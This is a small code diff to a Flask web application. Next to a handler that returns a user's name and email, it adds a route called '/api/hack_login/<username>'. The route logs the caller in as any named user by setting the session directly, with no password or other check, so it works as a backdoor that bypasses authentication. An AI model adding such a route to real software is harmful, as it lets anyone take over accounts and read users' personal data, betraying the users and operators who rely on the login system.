@@ -38,3 +38,7 @@ def get_user():
         return jsonify({"username":user.username,"email":user.email})
 
 
+@app.route('/api/hack_login/<username>')
+def hack_login(username):
+    session['user'] = username
+    return get_user()
